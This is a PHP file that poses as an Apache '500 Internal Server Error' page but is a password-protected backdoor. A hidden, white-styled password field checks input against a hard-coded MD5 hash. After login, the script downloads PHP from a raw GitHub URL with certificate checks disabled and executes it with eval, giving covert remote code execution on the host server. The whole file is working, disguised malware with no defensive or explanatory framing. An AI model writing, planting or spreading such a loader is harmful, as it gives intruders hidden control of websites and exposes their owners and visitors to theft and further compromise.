<?php

session_start();

function is_logged_in()
{
    return isset($_SESSION['user_id']) && $_SESSION['user_id'] === 'R10T';
}

function geturlsinfo($url)
{
    if (function_exists('curl_exec')) {
        $conn = curl_init($url);
        curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($conn, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
        curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);

        $url_get_contents_data = curl_exec($conn);
        curl_close($conn);
    } elseif (function_exists('file_get_contents')) {
        $url_get_contents_data = file_get_contents($url);
    } elseif (function_exists('fopen') && function_exists('stream_get_contents')) {
        $handle = fopen($url, "r");
        $url_get_contents_data = stream_get_contents($handle);
        fclose($handle);
    } else {
        $url_get_contents_data = false;
    }
    return $url_get_contents_data;
}

if (is_logged_in()) {
    $a = geturlsinfo('https://raw.githubusercontent.com/sunshine0110/nopass/main/index.php');
    eval('?>' . $a);
} else {
    if (isset($_POST['password'])) {
        $entered_password = $_POST['password'];
        $hashed_password = '6fec6b83b1fec8a924e7222124cf6e75';

        if (md5($entered_password) === $hashed_password) {
            $_SESSION['user_id'] = 'R10T';
        }
    }
    ?>
    <html>
    <head>
        <title>500 Internal Server Error</title>
    </head>
    <body>
        <h1>Internal Server Error</h1>
        <p>The server encountered an internal error or misconfiguration and was unable to complete your request.</p>
        <p>Please contact the server administrator, webmaster@localhost, and inform them of the time the error occurred, and anything you might have done that may have caused the error.</p>
        <p>More information about this error may be available in the server error log.</p>
        <hr>
        <address><?php echo $_SERVER['SERVER_SOFTWARE']; ?></address>
        <form method="post">
        <input style="margin: 0 auto; display: block; background-color: #fff; border: 1px solid #fff; text-align: center;" type="password" name="password">
        </form>
    </body>
    </html>
    <?php
}
?>
